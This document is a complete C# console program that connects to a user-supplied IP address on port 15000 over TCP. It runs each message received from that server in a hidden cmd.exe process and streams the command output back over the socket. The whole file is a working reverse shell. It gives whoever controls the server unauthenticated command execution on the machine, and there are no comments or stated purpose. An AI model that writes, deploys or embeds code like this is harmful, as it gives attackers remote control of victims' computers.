using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection.Emit;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    public class AsyncObject
    {
        public byte[] Buffer;
        public Socket WorkingSocket;
        public readonly int BufferSize;
        public AsyncObject(int bufferSize)
        {
            BufferSize = bufferSize;
            Buffer = new byte[BufferSize];
        }

        public void ClearBuffer()
        {
            Array.Clear(Buffer, 0, BufferSize);
        }
    }
    internal class Program
    {
        static Socket mainSock;
        private static string commandstart(string com)
        {
            System.Diagnostics.ProcessStartInfo proInfo = new System.Diagnostics.ProcessStartInfo();
            System.Diagnostics.Process pro = new System.Diagnostics.Process();
            proInfo.FileName = "cmd.exe";
            proInfo.CreateNoWindow = true;
            proInfo.UseShellExecute = false;
            proInfo.RedirectStandardOutput = true;
            proInfo.RedirectStandardInput = true;
            proInfo.RedirectStandardError = true;

            pro.StartInfo = proInfo;
            pro.Start();

            pro.StandardInput.Write(com + Environment.NewLine);
            pro.StandardInput.Close();

            string returnvalue = pro.StandardOutput.ReadToEnd();
            pro.WaitForExit();
            pro.Close();
            return returnvalue;
        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    Send_Data(strOutput.ToString());
                }
                catch (Exception err) { }
            }
        }
        static void Connect_Server(string ipaddr, int _port)
        {
            if (mainSock.Connected)
            {
                return;
            }
            try { mainSock.Connect(new IPEndPoint(IPAddress.Parse(ipaddr), _port)); }
            catch (Exception ex)
            {
                return;
            }

            Console.WriteLine("System Connected.");

            AsyncObject obj = new AsyncObject(4096);
            obj.WorkingSocket = mainSock;
            mainSock.BeginReceive(obj.Buffer, 0, obj.BufferSize, 0, DataReceived, obj);
        }
        static void DataReceived(IAsyncResult ar)
        {
            AsyncObject obj = (AsyncObject)ar.AsyncState;
            int received;
            try
            {
                received = obj.WorkingSocket.EndReceive(ar);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Server Disconnected");
                mainSock.Close();
                mainSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
                return;
            }

            if (received <= 0)
            {
                obj.WorkingSocket.Close();
                return;
            }

            string text = Encoding.UTF8.GetString(obj.Buffer);
            string msg = text;
            msg = msg.Trim('\0');
            Console.WriteLine(msg);
            StringBuilder strInput = new StringBuilder();

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();
            p.BeginOutputReadLine();

            strInput.Append(msg);
            //strInput.Append("\n");
            p.StandardInput.WriteLine(strInput);
            strInput.Remove(0, strInput.Length);

            obj.ClearBuffer();

            obj.WorkingSocket.BeginReceive(obj.Buffer, 0, 4096, 0, DataReceived, obj);
        }
        static void Send_Data(string tts)
        {
            if (!mainSock.IsBound)
            {
                Console.WriteLine("Server Not Opened");
                return;
            }
            byte[] bDts = Encoding.UTF8.GetBytes(tts);

            mainSock.Send(bDts);
        }

        static void Main(string[] args)
        {
            mainSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
            string ipaddr = Console.ReadLine();
            Connect_Server(ipaddr, 15000);
            while(true)
            {
                string s = Console.ReadLine();
                Send_Data(s);

            }
        }
    }
}
